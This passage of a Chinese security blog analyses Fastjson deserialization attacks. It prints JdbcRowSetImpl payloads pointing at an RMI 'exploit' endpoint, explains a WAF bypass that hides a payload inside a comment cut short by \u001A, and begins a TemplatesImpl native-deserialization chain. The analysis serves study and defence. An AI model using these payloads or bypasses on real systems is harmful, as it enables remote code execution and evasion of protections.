<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;aaa&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;bbb&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;isdataSourceName&quot;</span>: <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span>, </span><br><span class="line">        <span class="string">&quot;isautoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><p><code>com.alibaba.fastjson.parser.JSONLexerBase#nextToken</code> 函数在遇到注释的时候会调用 <code>skipComment</code> 跳过。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取下一个“记号”（token）的入口（仅展示与注释相关的片段）。</span></span><br><span class="line"><span class="comment"> * 典型流程：</span></span><br><span class="line"><span class="comment"> * 1) 每次进入时把临时缓冲指针 sp 清零；</span></span><br><span class="line"><span class="comment"> * 2) 记录当前位置 pos = bp（bp 为当前读取偏移）；</span></span><br><span class="line"><span class="comment"> * 3) 若当前字符 ch 是 &#x27;/&#x27;，则认为遇到注释起始，调用 skipComment() 吃掉注释后继续循环；</span></span><br><span class="line"><span class="comment"> * 4) 直到不再是注释或空白等，可由后续分支解析真正的 token。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 变量约定（fastjson 词法器常见命名）：</span></span><br><span class="line"><span class="comment"> * - bp：buffer pointer，输入缓冲区当前索引；</span></span><br><span class="line"><span class="comment"> * - pos：本次 token 起始位置（用于回溯/错误信息）；</span></span><br><span class="line"><span class="comment"> * - sp：string position，本次临时字符串缓存已写入的字符数；</span></span><br><span class="line"><span class="comment"> * - ch：当前字符（通常由 next() 推进并更新）；</span></span><br><span class="line"><span class="comment"> * - next()：推进 bp 并返回/更新下一个字符到 ch。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">nextToken</span><span class="params">()</span> &#123;</span><br><span class="line">    sp = <span class="number">0</span>;                     <span class="comment">// 重置当前 token 的临时写入计数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        pos = bp;               <span class="comment">// 记录当前起始位置（便于错误提示/回溯）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;        <span class="comment">// 以 &#x27;/&#x27; 开头，可能是注释</span></span><br><span class="line">            skipComment();      <span class="comment">// 吃掉注释（支持 // 与 /* ... */）</span></span><br><span class="line">            <span class="keyword">continue</span>;           <span class="comment">// 注释吃完后，继续尝试读取下一个有效字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [... 其他空白处理/类型码分派等逻辑 ...]</span></span><br><span class="line">        <span class="comment">// 遇到非注释的有效字符时，本方法其余分支会去解析实际 token。</span></span><br><span class="line">        <span class="keyword">break</span>;                  <span class="comment">// 这里只示意：跳出或进入其他分支处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>并且跳过空白字符的时候也会调用 <code>skipComment</code> 跳过注释。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跳过空白字符和注释。</span></span><br><span class="line"><span class="comment"> * 该方法会不断检查并跳过空白字符（如空格、回车、换行、制表符、换页符、退格符）和单行注释（以“/”开头）。</span></span><br><span class="line"><span class="comment"> * 如果遇到注释，则跳过整个注释，继续处理下一个字符。</span></span><br><span class="line"><span class="comment"> * 当遇到非空白字符和非注释字符时，停止跳过，方法执行完毕。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">// 如果当前字符小于或等于 &#x27;/&#x27;，则继续判断是否为空白字符或注释</span></span><br><span class="line">        <span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果当前字符是空白字符（空格、回车、换行、制表符、换页符、退格符），则跳到下一个字符</span></span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\r&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\f&#x27;</span> || ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                next();  <span class="comment">// 调用 next() 方法获取下一个字符</span></span><br><span class="line">                <span class="keyword">continue</span>;  <span class="comment">// 继续跳过空白字符</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 如果当前字符是 &#x27;/&#x27;, 则是注释，跳过注释</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                skipComment();  <span class="comment">// 调用 skipComment() 方法跳过注释</span></span><br><span class="line">                <span class="keyword">continue</span>;  <span class="comment">// 继续跳过注释</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="comment">// 如果不是空白字符和注释，退出循环</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// 如果当前字符大于 &#x27;/&#x27;，说明遇到非空白字符或注释，退出循环</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>skipComment</code> 中，判断注释结束时有一个特殊的标志 <code>EOI(0x1A)</code>。当 <code>skipComment</code> 遇到该字符时意味着注释结束，因此会立即返回。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>遇到 <code>EOI</code> 时这里不会再额外调用 <code>next()</code> 把它“吃掉”，而是直接返回</strong>，保留当前 <code>ch == EOI</code> 的状态；下一次由外层代码再调用 <code>next()</code>，指针才会继续往后走。</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跳过注释。</span></span><br><span class="line"><span class="comment"> * 支持两种形式：</span></span><br><span class="line"><span class="comment"> * 1) 行注释：// ... \n</span></span><br><span class="line"><span class="comment"> * 2) 块注释：/* ... *\/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 细节：</span></span><br><span class="line"><span class="comment"> * - next() 会推进指针并更新 ch。</span></span><br><span class="line"><span class="comment"> * - EOI（End Of Input）表示输入结束（fastjson 中常量值为 0x1A，SUB），</span></span><br><span class="line"><span class="comment"> *   一旦在注释内遇到 EOI，就直接返回（相当于“吃到尽头”或“提早结束”）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 风险提示（实现行为）：</span></span><br><span class="line"><span class="comment"> * - 行注释只以 &#x27;\n&#x27; 为结束标志，若是 Windows 风格 &quot;\r\n&quot;，代码会在读到 &#x27;\n&#x27; 时结束；</span></span><br><span class="line"><span class="comment"> * - 块注释必须读到 &#x27;*&#x27; 后紧跟 &#x27;/&#x27; 才视为结束；若中途遇到 EOI 会直接返回。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">skipComment</span><span class="params">()</span> &#123;</span><br><span class="line">    next();                     <span class="comment">// 读取 &#x27;/&#x27; 之后的一个字符，决定注释类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;            <span class="comment">// 形式：// 注释</span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            next();             <span class="comment">// 逐字符前进直到行尾</span></span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span>) &#123;   <span class="comment">// 行尾，吃掉换行并返回</span></span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == EOI) &#123; <span class="comment">// 输入结束（0x1A 等），直接返回</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;*&#x27;</span>) &#123;     <span class="comment">// 形式：/* 块注释 */</span></span><br><span class="line">        next();                 <span class="comment">// 进入块内容</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; ch != EOI; ) &#123;   <span class="comment">// 直到读到输入结束才跳出</span></span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;*&#x27;</span>) &#123;    <span class="comment">// 可能是结束符的前导 &#x27;*&#x27;</span></span><br><span class="line">                next();         <span class="comment">// 看下一字符</span></span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123; <span class="comment">// 匹配到 &quot;*/&quot; 结束块注释</span></span><br><span class="line">                    next();     <span class="comment">// 吃掉 &#x27;/&#x27; 并把指针移到注释后的第一个字符</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;   <span class="comment">// 不是 &#x27;/&#x27;，继续在注释体内前进</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            next();             <span class="comment">// 普通注释内容，继续前进</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 既不是 // 也不是 /*，则不是合法注释起始</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;invalid comment&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>当 <code>skipComment</code> 因为遇到 <code>EOI</code> 而立即返回后，如果是返回到 <code>nextToken</code> 函数，则由于 <code>nextToken</code> 的循环中没有针对 <code>EOI</code> 的分支，因此会进入 <code>default</code> 分支。这里 <code>isEOF()</code> 返回 <code>false</code> 因此进入 <code>else</code> 分支。而在 <code>else</code> 分支，由于 <code>ch = EOI &lt;= 31</code> 因此会执行 <code>next()</code> 将当前字符吃掉然后跳出循环。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// （位于 nextToken() 的一个 switch 分支的 default: 情况）</span></span><br><span class="line"><span class="comment">// 说明：当前字符 ch 不属于其他已知分支（数字、引号、花括号、方括号等）时走到这里</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">if</span> (isEOF()) &#123;                 <span class="comment">// JLS：到达输入末尾？</span></span><br><span class="line">        <span class="comment">// [...]                   // 典型实现里会设置 token = EOF / JSONToken.EOF 等并收尾</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则还没“彻底”到达末尾（或 ch 不是末尾语义）</span></span><br><span class="line">        <span class="keyword">if</span> (ch &lt;= <span class="number">31</span> || ch == <span class="number">127</span>) &#123;   <span class="comment">// 控制字符范围（0..31）或 DEL(127)</span></span><br><span class="line">            next();                    <span class="comment">// 将当前控制字符“吃掉”并前进一位</span></span><br><span class="line">                                       <span class="comment">// 注意：EOI = 26（0x1A）属于 &lt;=31，这里会被吃掉</span></span><br><span class="line">            <span class="keyword">break</span>;                     <span class="comment">// 跳出 switch，回到 for(;;) 进入下一轮判定</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非法字符（既不是 EOF、也不是控制字符），报词法错误后跳过当前字符</span></span><br><span class="line">        lexError(<span class="string">&quot;illegal.char&quot;</span>, String.valueOf((<span class="type">int</span>) ch));</span><br><span class="line">        next();                        <span class="comment">// 前进一位，避免死循环</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;                            <span class="comment">// 收尾返回（具体语义视外围结构而定）</span></span><br></pre></td></tr></table></figure></div>

<p>这里 <code>isEOF</code> 实际上调用的是 <code>com.alibaba.fastjson.parser.JSONScanner#isEOF</code>，实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否到达输入末尾（End Of File/Input）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：</span></span><br><span class="line"><span class="comment"> * 1) bp == len        ：指针已经等于输入长度 → 真正越界/读尽</span></span><br><span class="line"><span class="comment"> * 2) ch == EOI 且 bp+1 == len：</span></span><br><span class="line"><span class="comment"> *    当前字符是 EOI(0x1A) 且指针的“下一位”刚好是末尾，</span></span><br><span class="line"><span class="comment"> *    这是 fastjson 的“尾端 EOI”判定（把 SUB 当作流结束哨兵）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEOF</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> bp == len || ch == EOI &amp;&amp; bp + <span class="number">1</span> == len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>ch == EOI</code> 但是不满足 <code>bp + 1 == len</code> 即没有解析到 json 数据末尾，因此会返回 <code>false</code>。</p>
<p>因此像下面这种写法，前面的注释是被 <code>\u001A</code> 截断，并且 <code>\u001A</code> 本身被忽略，而后面的 <code>*/</code> 由于前面 json 已经触发利用因此也不需要关心了。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;/*\u001A&#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/exploit\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#125;*/&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>而如果 WAF 使用这种下面形式删除注释快，那么会将 <code>json</code> 中的 <code>\* ... *\</code> 形式的注释连带中间内容清空。因此经过这层过滤后在 WAF 的视角 <code>json</code> 是空数据，而实际进行反序列化的却是原数据，那么就可以绕过 WAF。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">&quot;(/\*(.*?)\*/)&quot;</span>, <span class="string">&quot;&quot;</span>, json);</span><br></pre></td></tr></table></figure></div>

<hr>
<p>如果是下面这种 payload 则会返回到 <code>skipWhitespace</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot; /*\u001A  \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/exploit\&quot;,\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;  \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#125;*/&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>skipWhitespace</code> 函数中，从 <code>skipComment</code> 返回时解析的字符是 <code>EOI</code>，不属于任何一个空白字符，因此紧接着又会从 <code>skipWhitespace</code> 函数返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\r&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\f&#x27;</span> || ch == <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">                next();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                skipComment();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通常这会返回到 <code>parseObject</code> 函数，随后由于开启 <code>AllowArbitraryCommas</code> 会跳过任意数量的 <code>,</code>；之后会对当前字符进行判断。显然此时当前字符是 <code>EOI</code>，因此会抛出 <code>syntax error</code> 错误。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lexer.skipWhitespace();</span><br><span class="line"><span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line"><span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        lexer.skipWhitespace();</span><br><span class="line">        ch = lexer.getCurrent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="FastJson-原生反序列化"><a href="#FastJson-原生反序列化" class="headerlink" title="FastJson 原生反序列化"></a>FastJson 原生反序列化</h1><p>FastJson 中继承 <code>Serializable</code> 接口的只有 <code>JSONArray</code> 与 <code>JSONObject</code>，因此我们只能针对这两个类寻找反序列化利用链。</p>
<h2 id="Fastjson1"><a href="#Fastjson1" class="headerlink" title="Fastjson1"></a>Fastjson1</h2><p>虽然 <code>JSONArray</code> 有实现这个 <code>Serializable</code> 接口但是它本身没有实现 <code>readObject</code> 方法的重载，并且继承的 <code>JSON</code> 类同样没有 <code>readObject</code> 方法，那么只有一个思路了，通过其他类的 <code>readObject</code> 做中转来触发 <code>JSONArray</code> 或者 <code>JSON</code> 类当中的某个方法最终实现反序列化利用。</p>
<p>我们想到，前面 <code>BasicDataSource</code> 利用链通过触发 <code>JSONObject</code> 对象的 <code>toString</code> 方法来触发序列化过程：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>toString</code> 方法继承于 <code>JSONObject</code> 的父类 <code>JSON</code>，而 <code>JSONArray</code> 同样继承于 <code>JSON</code>。</p>
<p>因此我们只需要寻找一个能在反序列化过程中触发 <code>JSONArray</code> 类型的成员的 <code>toString</code> 方法的类，然后再通过 <code>JSONArray</code> 的序列化过程调用 <code>TemplatesImpl#getOutputProperties</code> 方法实现任意字节码加载就可以完成利用。</p>
<p><code>javax.management.BadAttributeValueExpException</code> 在反序列化的时候会触发 <code>val</code> 属性的 <code>toString</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反序列化钩子：读取旧流中的持久化字段并恢复本对象的内部字段 &#123;<span class="doctag">@code</span> val&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;实现思路：</span></span><br><span class="line"><span class="comment"> * 1) 使用 &#123;<span class="doctag">@link</span> ObjectInputStream#readFields()&#125; 走“默认字段读取”路径，拿到持久化字段集；</span></span><br><span class="line"><span class="comment"> * 2) 取出名为 &quot;val&quot; 的字段值（不存在则用 null）；</span></span><br><span class="line"><span class="comment"> * 3) 分类型做兼容与安全处理：</span></span><br><span class="line"><span class="comment"> *    - null            → 直接赋 null；</span></span><br><span class="line"><span class="comment"> *    - String          → 直接赋（最理想的情况）；</span></span><br><span class="line"><span class="comment"> *    - 其它对象：</span></span><br><span class="line"><span class="comment"> *        * 若当前无 SecurityManager（多数现代 JDK 恒为 null），或该对象是包装类</span></span><br><span class="line"><span class="comment"> *         （Long/Integer/Float/Double/Byte/Short/Boolean），则调用 &#123;<span class="doctag">@code</span> toString()&#125; 并赋值；</span></span><br><span class="line"><span class="comment"> *        * 否则（存在安全管理器 且 类型不在白名单）：为避免在不受信类型上执行</span></span><br><span class="line"><span class="comment"> *          覆盖的 &#123;<span class="doctag">@code</span> toString()&#125;，采用“身份字符串”降级：</span></span><br><span class="line"><span class="comment"> *          &#123;<span class="doctag">@code</span> System.identityHashCode(obj) + &quot;@&quot; + obj.getClass().getName()&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;背景：这是为兼容“修复 JDK-8019292 之前版本”序列化出来的流——老版本里 &quot;val&quot;</span></span><br><span class="line"><span class="comment"> * 可能被写成了非 String 类型。为避免在不受信对象上调用自定义 &#123;<span class="doctag">@code</span> toString()&#125; 带来</span></span><br><span class="line"><span class="comment"> * 副作用/安全风险，在有 SecurityManager 的环境下仅允许对基础包装类型取 &#123;<span class="doctag">@code</span> 